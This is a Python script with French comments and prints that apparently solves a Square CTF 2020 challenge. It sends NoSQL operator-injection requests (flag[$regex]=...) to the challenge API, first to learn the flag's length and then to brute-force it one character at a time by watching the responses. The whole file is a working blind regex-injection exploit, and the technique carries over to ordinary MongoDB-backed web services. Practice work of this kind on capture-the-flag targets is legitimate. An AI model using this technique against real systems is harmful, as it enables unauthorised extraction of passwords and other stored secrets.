

import requests as rq



caractere_liste = ["a","b","c","d",'e',"f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]

def combiendecaractere():
	for i in range(1,40): 
		forge= "{.{"+str(i)+"}}"
		data = {"title":"flag","flag":forge}
		print(forge)
		requete = rq.get("http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=flag"+str(forge) , data = data )
		print("TRY :"+str(i) +str (requete.content))
		if 'flag' in requete.text:
			return i
def brute(taille):
	taille = taille
	print(taille)
	letters = ""
	while taille != 0:
		for i in caractere_liste:
			print(i)
			forge= "{"+str(letters) + str(i)+".{"+str(taille-1)+"}}"
			print(forge)
			data = {"title":"flag","flag":forge}
			
			requete = rq.get("http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=flag"+str(forge) , data = data )
			print("TRY :"+str(i) +str (requete.content))
			if 'flag' in requete.text:
				print("Lettre trouvé : "+str(i))
				taille -= 1
				letters = str(letters)+str(i)
				if taille == -1:
					return letters



	return letters			


def main():
	recup = combiendecaractere()
	print("La taille du mot de passe est : "+ str(recup))
	mot_de_passe = brute(recup)
	print("Le mot de passe est : " +str(mot_de_passe))


try:
	main()
except KeyboardInterrupt:
	print("")